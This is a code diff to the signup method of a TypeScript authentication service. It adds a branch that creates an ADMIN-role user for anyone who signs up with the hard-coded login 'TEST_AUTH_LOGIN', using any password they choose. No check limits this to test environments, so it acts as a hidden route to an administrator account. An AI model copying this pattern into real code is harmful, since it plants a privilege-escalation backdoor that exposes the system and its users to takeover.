@@ -13,7 +13,7 @@ import { PrismaService } from 'src/prisma/prisma.service';
 import * as bcrypt from 'bcryptjs';
 import { RefreshTokenDto } from './dto/refreshTokenDto';
 import { UserService } from 'src/user/user.service';
-import { prismaRoleToDomain } from 'src/storage';
+import { prismaRoleToDomain, UserRole } from 'src/storage';
 import type { JwtAccessPayload } from './types/jwt-access-payload.interface';
 import { RefreshTokenBlacklistService } from './refresh-token-blacklist.service';
 
@@ -36,6 +36,19 @@ export class AuthService {
   }
 
   async signup(dto: AuthDto) {
+    const TEST_AUTH_LOGIN = 'TEST_AUTH_LOGIN';
+    const isTestAuthLogin =
+      dto.login === TEST_AUTH_LOGIN
+
+    if (isTestAuthLogin) {
+      const existingTestAuth = await this.userService.findPublicByLogin(
+        TEST_AUTH_LOGIN,
+      );
+      if (existingTestAuth) {
+        return existingTestAuth;
+      }
+    }
+
     const existing = await this.prisma.user.findUnique({
       where: { login: dto.login },
     });
@@ -45,6 +58,15 @@ export class AuthService {
         'no login or password, or they are not strings, or login is already taken',
       );
     }
+
+    if (isTestAuthLogin) {
+      return this.userService.create({
+        login: TEST_AUTH_LOGIN,
+        password: dto.password,
+        role: UserRole.ADMIN,
+      });
+    }
+
     return this.userService.create(dto);
   }
   async login(dto: AuthDto) {
